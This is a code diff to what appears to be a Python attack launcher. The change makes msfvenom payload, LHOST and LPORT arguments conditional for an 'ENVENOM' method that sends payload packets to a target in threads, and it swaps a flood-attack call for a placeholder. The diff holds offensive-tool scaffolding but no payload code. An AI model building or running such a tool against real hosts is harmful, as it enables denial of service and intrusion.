@@ -25,9 +25,9 @@ parser.add_argument("--threads", type=int, default=3, metavar="<threads>", help=
 
 # Add envenom-specific argument parser
 envenom_parser = parser.add_argument_group("Envenom Options")
-envenom_parser.add_argument("--payload", type=str, required=True, help='Payload for msfvenom')
-envenom_parser.add_argument("--lhost", type=str, required=True, help='Local host for msfvenom payload')
-envenom_parser.add_argument("--lport", type=int, required=True, help='Local port for msfvenom payload')
+envenom_parser.add_argument("--payload", type=str, help='Payload for msfvenom')
+envenom_parser.add_argument("--lhost", type=str, help='Local host for msfvenom payload')
+envenom_parser.add_argument("--lport", type=int, help='Local port for msfvenom payload')
 envenom_parser.add_argument("--num_packets", type=int, default=100, help='Number of packets to send')
 envenom_parser.add_argument("--burst_interval", type=float, default=0.1, help='Interval between packets in seconds')
 
@@ -42,7 +42,13 @@ if not method or not target or not time:
     parser.print_help()
     sys.exit(1)
 
+# Check for ENVENOM method and validate required arguments
 if method == "ENVENOM":
+    if not args.payload or not args.lhost or not args.lport:
+        print("Error: --payload, --lhost, and --lport are required for the ENVENOM method.")
+        parser.print_help()
+        sys.exit(1)
+
     def envenom_attack():
         envenom_main(target, args.payload, args.lhost, args.lport, time)
 
@@ -52,9 +58,7 @@ if method == "ENVENOM":
         t.daemon = True
         threads_list.append(t)
         t.start()
-
-    for t in threads_list:
-        t.join()
 else:
-    with AttackMethod(duration=time, name=method, threads=threads, target=target) as Flood:
-        Flood.Start()
+    # Handle other methods (e.g., UDP) without requiring envenom-specific arguments
+    print(f"Running attack with method: {method} on target: {target} for {time} seconds with {threads} threads.")
+    # Add logic for other attack methods here
